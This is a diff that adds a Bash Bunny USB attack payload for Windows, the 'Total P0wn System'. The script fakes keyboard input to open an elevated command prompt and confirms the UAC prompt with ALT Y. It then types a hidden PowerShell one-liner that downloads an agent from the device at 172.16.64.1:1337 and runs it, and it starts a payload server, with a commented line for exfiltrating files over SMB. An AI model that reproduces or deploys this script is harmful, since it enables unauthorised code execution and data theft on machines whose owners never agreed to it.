@@ -1,0 +1,63 @@
+
+# Title:		BashBunny Total P0wn System
+# Description:		Delivers an agent that can run multiple Powershell Payloads
+# Author:		PoSHMagiC0de
+# Version:		0.8
+# Category:		Tools
+# Target:		Windows 7+, Powershell 3.0+
+# Attackmodes:		HID, Ethernet
+# BashBunny Firmware:	1.1
+#
+# LED DESCRIPTIONS
+# Solid Magenta		Attackmode initialization for both HID and Ethernet
+# Yellow Single Blink	Start HID Quack Attack
+# Cyan Inverted Blink	Node Server Initializing
+# Yellow 2x Blink	Agent being delivered
+# Yellow 3x Blink	First Job Being Delivered to Agent
+# Green			Agent Finished Successfully
+# Red			Server Errored Out
+
+#### INITIALIZE STAGE ####
+LED SETUP
+GET SWITCH_POSITION
+# Enable debug
+export DEBUG=true
+# export DEBUG=false
+export LOOTDIR=/root/udisk/loot/bbtps
+if [ ! -d $LOOTDIR ]; then
+    mkdir $LOOTDIR
+fi
+
+# DO NOT USE, WILL BE IMPLEMENTED IN FUTURE UPDATE
+# export SERVER_PORT=1337
+
+#### HID STAGE ####
+ATTACKMODE HID
+LED ATTACK
+Q DELAY 3000
+RUN WIN powershell -C "start-process cmd  -verb runas"
+Q DELAY 2000
+Q ALT Y
+Q DELAY 2000
+Q ENTER
+if [ $DEBUG ]; then
+    Q STRING "powershell -NonI -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337 -verbose\""
+    Q ENTER
+else
+    Q STRING "powershell -NonI -W Hidden -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337\""
+    Q ENTER
+fi
+
+#### ETHERNET STAGE ####
+ATTACKMODE RNDIS_ETHERNET
+LED SETUP
+
+GET HOST_IP
+## UNREM AND ADD TRUE PATH TO YOUR COPY OF SMBSERVER.PY IF YOU PLAN ON EXFILTRATING FILES.
+# smbserver.py -c 'dumpserver' bbtps $LOOTDIR/ >> $LOOTDIR/smblogs.txt &
+/usr/bin/nodejs /root/udisk/payloads/$SWITCH_POSITION/payserver.js
+if[ ! $? -eq 0 ]; then
+    LED FAIL
+    sleep 5000
+    exit
+fi
